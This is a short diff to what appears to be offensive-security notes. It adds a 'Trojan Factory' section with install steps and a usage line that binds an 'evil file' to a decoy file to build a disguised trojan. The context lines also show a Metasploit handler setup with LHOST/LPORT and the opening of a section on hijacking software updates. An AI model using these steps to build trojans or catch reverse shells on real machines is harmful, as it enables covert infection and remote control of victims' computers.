@@ -320,6 +320,19 @@ set LHOST 10.10.10.10
 set LPORT 8080
 exploit
 ```
+## Trojan Factory
+- https://github.com/z00z/TrojanFactory
+Installation:
+    - Download AutoIt (https://www.autoitscript.com/site/autoit/downloads/).
+    - Install it using wine > wine autoit-v3-setup.exe
+    - Clone Trojan Factory: > git clone https://github.com/z00z/TrojanFactory.git
+    - You're all set, navigare into TrojanFactory > cd TrojanFactory
+    - Run --help for usage > python trojan_factory.py --help
+
+```
+python trojan_factory.py -f (Front file url) -e (evil file url) -o (export path) -i (icon)
+```
+
 ## Fake Update
 If the updates are coming from
 a https website, then we won't be able to hijack them
